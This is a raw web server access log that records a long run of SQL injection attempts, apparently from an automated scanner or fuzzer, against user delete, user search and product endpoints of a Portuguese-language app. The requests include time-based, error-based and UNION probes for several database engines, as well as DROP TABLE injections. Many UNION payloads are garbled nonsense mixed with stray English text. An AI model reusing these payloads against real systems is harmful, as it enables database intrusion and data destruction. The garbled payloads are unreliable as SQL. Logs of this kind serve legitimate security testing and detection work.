Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%22%20or%201%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%7C%7C%20(%20select%20'jrbp'%20from%20dual%20where%204129%20=%204129%20or%208514%20=%20benchmark%20(%205000000,md5%20(%200x544d5a4c%20)%20)%20 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22)))%20and%206537=dbms_pipe.receive_message(chr(76)%7C%7Cchr(116)%7C%7Cchr(117)%7C%7Cchr(65),5)%20and%20(((%22ntlz%22=%22ntlz HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25%22%20)%20)%20union%20all%20select%20null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20as%20vpop%20where%202528%20=%202528%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20and%20(%20'fpcf'%20=%20'fpcf HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%7B;%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-9856%25')))%20or%205023=ctxsys.drithsx.sn(5023,(chr(113)%7C%7Cchr(113)%7C%7Cchr(112)%7C%7Cchr(106)%7C%7Cchr(113)%7C%7C(select%20(case%20when%20(5023=5023)%20then%201%20else%200%20end)%20from%20dual)%7C%7Cchr(113)%7C%7Cchr(122)%7C%7Cchr(118)%7C%7Cchr(122)%7C%7Cchr(113)))%20and%20(((%22%25%22=%22 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20)%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20and%20(%20(%20(%20'ebwt'%20=%20'ebwt HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20as%20dykb%20where%207812%20=%207812%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=%203754))))) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20)%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20(%20case%20when%20(%201005%20=%205996%20)%20then%201%20else%201005*%20(%20select%201005%20from%20master..sysdatabases%20)%20end%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/testif%20(%204135%20=%202165%20)%20select%204135%20else%20drop%20function%20otyy%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20'uqfs'%20=%20'uqfs HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20xebq%20where%207959%20=%207959%20union%20all%20select%20null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20where%206408%20=%206408%20union%20all%20select%20null,null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-9954%22%20)%20as%20xznc%20where%209364%20=%209364%20union%20all%20select%209364,9364,9364,9364,9364,9364,9364,9364,9364 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'+%20(%20select%20'rejz'%20where%201530%20=%201530%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122)))) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20yyud%20where%204934%20=%204934 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20and%20extractvalue%20(%207982,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%207982%20=%207982,1%20)%20)%20)%20,0x717a767a71%20)%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20qhyv%20where%208718%20=%208718%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-1372%25%22%20)%20)%20)%20or%20make_set%20(%209354%20=%209354,7185%20)%20and%20(%20(%20(%20'szcf'%20=%20'zcff HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'+%20(%20select%20'fqkk'%20where%209725%20=%209725 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%7C%7C%20(%20select%20'gnil'%20from%20dual%20where%207552%20=%207552%20rlike%20(%20select%20(%20case%20when%20(%207689%20=%207689%20)%20then%201%20else%200x28%20end%20)%20)%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20)%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20and%20(%20(%20(%20'lajk'%20=%20'lajk HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%7C%7C%20(%20select%20'jnsd'%20from%20dual%20where%202316%20=%202316%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25%22%20)%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20and%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20xrre%20where%201172%20=%201172%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25'%20and%207533=7533%20and%20'%25'=' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20as%20wokl%20where%201368%20=%201368%20union%20all%20select%20null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20%22kbex%22%20like%20%22kbex HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20as%20ycsr%20where%202238%20=%202238%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20--%20kvkk HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+ide+Lice+table+NAtE+%29+%2C%28SELECT+1%29+--+0O1E HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_pare%29nom+table_name+F+LIMSTUSION+AND+THE+FANSE+%3D+1+%3D+%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%29+peasin%27t+like+%27pable%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+--%2C1%2C%40%2Csechena HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%28%2C+users%2Cversion+%28+%29+and+%27i%27+%3D+1%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+SELECT+VErSiON+%28+%29+%2Cversion+%28+%29+%2CnoM+in+%2C+%28+VErser+%2C+vEVeRsInn%2C+%29+%2C+rownUm+aS+LIMiT+FRoM+DBA_ROLe_PriVS+WHERE+GRANTEE+%3D+SYS.LOGINUSER+%29+WHERE+LIMIT+%3D+4+%29+%29+AND+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_sale_%29+%3B%3B%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charely%29+%29+%3B+vallingeres+2+%2C%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+OR+False%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name%2C+DRoM+iNtor%27serdion%27s+Pheragev%27+Lave+%27%2C+%27verswall%27+%29+%2C+%27%29+%3Bwaitfor+delay+%270%3A0%3A__TIME__%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+and+%27vevite%27like+%27vite+vike+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmateine+%28%29+%2C+%40%2C1%2C5%2C1%2C7%29+AND+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Tuml_nmemace%29%2Cbelcame_bencebbencomanbef%28cromin%280000000%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2C%2Cversion+%29+and+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscolame+%29+FroM+%28+SELECT+DISTINCT+%28+USERname+%29+%2C+rownum+aS+LIMIT+FROM+syS.all_users+%29+WHERE HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscolame+%29+FroM+%28+SELECT+DISTINCT+%28+password+%2C+%29+%2C+ROWnUm+aS+LiMiT+FROM+sYS.all_useRs+%29+WHERE+LIMIT+%3D+6+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+ullecall+tame+name+%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmateine+%28+%27%2C+%28%2C%2C%40%40VERSION+AND+%27p%27+NOT+LIKE+%27Y%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+noce_mamn%3Btabecname+FROM+v%24ilstabace+%29+%29+AND+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%2Cverscolement%29%2C+full_thine%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+%2Cusers+%2C%29%2Cversion+%29+%3B+AnD+%27i%27%3D%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+cvar.teme%29%29+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+ullecale+nomenatelbent+table+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3D+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_nible%2C+vible_nate+FRIM+inibitioNAS+WASTER+NOW+FALLIND+WHERE+AS+THE+AGIANALE+AND+DIREND+DIGHTARES+be+a+film+about+a+bad+religious+subject+in+the+1930s.+Carolin+This+is+a+really+enjoyable+college+good+epic+dia HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+%2C1%2C0x70+AND+1+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+%2C0x6073+Alle%2F%2AHame+stazes+timely+and%2A%2F157+%3D+9127 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+-+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEM+UNOM%3BALL+1+9+%3B%29+%3Bwaitf%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+%29+%29+or+sleep+%28+5+%29+and+%28+%28+%28+2209+%3D+2209 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-9337+%29+union+all+sele%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%29%29%3Bselect+pg_sleep%285%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-6737%27+%29+%29+union+all+select+3257+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%25%22+%29+%29+%29+and+3707+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t2+%29+and+%28+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%22umfr%22+like+%22umfr HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+%29+and+3715+in+%28+%28+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+sleep+%28+5+%29+and+%27%25%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22%7B%3B%22+or+1+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%27cqwz%27+like+%27cqwz HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-2394%27+%29+union+all+select+1650%2C1650%2C1650%2C1650%2C1650%2C1650%2C1650+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%7C%7C+%28+select+%27uvbb%27+where+7795+%3D+7795+or+char+%28+117+%29+%7C%7Cchar+%28+111+%29+%7C%7Cchar+%28+105+%29+%7C%7Cchar+%28+100+%29+%3D+regexp_substring+%28+repeat+%28+left+%28+crypt_key+%28+char+%28+65+%29+%7C%7Cchar+%28+69+%29+%7C%7Cchar+%28+83+%29+%2Cnull+%29+%2C0+%29+%2C50000 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-9656%22+union+all+select+8735%2C8735+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+or+7417+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+as+mtnw+where+7293+%3D+7293+and+2603+%3D+5764+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22%3B%7B%22+or+1+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+as+casu+where+6223+%3D+92%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+%29+and+%28+select+2%2A+%28+if+%28+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+3484+%3D+3484%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+s+%29+%2C+8446744073709551610%2C+8446744073709551610+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-1834%27+%29+as+crsi+where+2485+%3D+2485+or+4144+%3D+%28+select+upper+%28+xmltype+%28+chr+%28+60+%29+%7C%7Cchr+%28+58+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4144+%3D+4144%29%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%7C%7C+%28+select+%27ylek%27+where+3803+%3D+3803+and+4241+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+4241+%3D+4241+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+1%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%25%22+or+8466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29+and+%22%25%22%3D%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+%29+and+6510+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%28+%28+%27igav%27+%3D+%27iuca HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%29%29%29+and+2853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%282853%3D2853%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+and+%28%28%286556%3D6556 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%2B+%28+select+iews+where+6012+%3D+6012+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+gcrr+%29+%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%28+case+when+%28+4755+%3D+4784+%29+then+1+else+4755%2A+%28+select+4755+from+master..sysdatabases+%29+end+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+as+azdb+where+4219+%3D+4219+union+all+select+null%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+and+6510+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+9814+%3D+9814 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22%2C%26%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-2046%27+%29+%29+%29+or+make_set+%28+9354+%3D+9354%2C7185+%29+and+%28+%28+%28+%27mstq%27+%3D+%27mstq HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%2B+%28+select+%27lpkv%27+where+8760+%3D+8760 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%29%3Bselect+dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29+from+dual+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+or+8514+%3D+benchmark+%28+5000000%2Cmd5+%28+0x544d5a4c+%29+%29+%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+as+yyyb+where+1705+%3D+1705+and+%28+8770+%3D+6988+%29+%2A6988+-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verseoncmate%20the%20(%20ROWpuPS HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,usern;tall_alc HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20(%20table_samerial,name_NiML%20,%20(%20'SELECT%20@vErsion%20)%20,%20(SELECT%208),5x0x0x0%20)%20, HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@,verscomanet2,2,1,1,1,4.4. HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,alecture)%20palice%20table%20name%20'%20AND%201%20,1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made,%20(%201,0x4c7)%20)%20/**/) HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat'%20)%20)%20,1,1,1%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trectallyurederivelat%20select%20vardering%20)%20char%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204344%20=%204344%20)%20then%201%20else%200%20end%20)%20from HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20userschamelocver%20tens%20an HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20inD%20(SELECT%20(SELECT%20(SELECT%20(SELECT%201))))%20AND%20'i'%20NOT%20LIKE%20'I'%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1001%20)%20and%20(%201021%20=%201021 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gal_wabes%202%20)%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20FROM%20tubl_NIDergecimeminge HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,matebempelabes%20temp/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20all_ther%20'1,2,slemp.(elc%20(%20xxme%20)%20legv%20mangere%20(chr%20(%20112%20)%20%7C%7Cchr%20(%2065%20)%20%7C%7Cchr%20(%2060%20)%20%7C%7Cchr%20(%2060%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',')%20%3E%201%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20(%20,%20ull,masnghpall);%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20lybe_taber';%20)%20+ind'%20(%201%20)%20=%201,1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gename_ser%20and%20timatep. HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'SaNJ'%20LIKe%20'vAJ'%20)%20,(SELect%200X1)%20--%201 HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
